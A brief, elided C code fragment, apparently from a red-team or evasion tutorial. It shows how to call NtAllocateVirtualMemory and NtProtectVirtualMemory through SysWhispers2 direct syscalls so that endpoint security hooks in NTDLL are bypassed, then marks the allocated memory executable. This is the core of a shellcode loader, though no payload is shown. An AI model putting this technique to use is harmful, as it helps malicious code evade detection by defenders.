/* Calls syscalls directly, bypassing userland hooking of the NTDLL */
#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
...
int main() {
	...
	// We use a direct syscall generated by Syswhispers2 to call NtAllocateVirtualMemory, the underlying
	// function used by VirtualAlloc.	
	SIZE_T alloc_size = len;
	void* executable_memory = NULL;
	NtAllocateVirtualMemory((HANDLE)-1, &executable_memory, NULL, &alloc_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	...
	NtProtectVirtualMemory((HANDLE)-1, &executable_memory, &alloc_size, PAGE_EXECUTE_READ, &old_protect);
